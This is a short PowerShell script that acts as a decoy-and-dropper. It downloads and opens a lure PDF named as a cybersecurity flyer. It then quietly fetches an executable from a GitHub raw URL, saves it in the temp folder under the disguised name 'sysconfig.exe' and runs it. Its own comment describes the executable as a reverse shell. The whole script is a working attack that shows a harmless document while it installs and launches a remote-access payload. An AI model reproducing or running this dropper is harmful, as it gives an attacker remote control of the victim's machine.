# Define the URL and output file path
$PdfUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/sample-2.pdf" 
$OutputPath = "$env:TEMP\Flyer Cybersécurité VF1.pdf"

# Download the PDF
Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath

# Open the downloaded PDF
Start-Process -FilePath $OutputPath

# Define the URL and output file path
$ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/shell_v2.exe" 
$ShellOutputPath = "$env:TEMP\sysconfig.exe"

# Download the PDF
Invoke-WebRequest -Uri $ShellUrl -OutFile $ShellOutputPath

# Execute the reverse shell
Start-Process -FilePath $ShellOutputPath

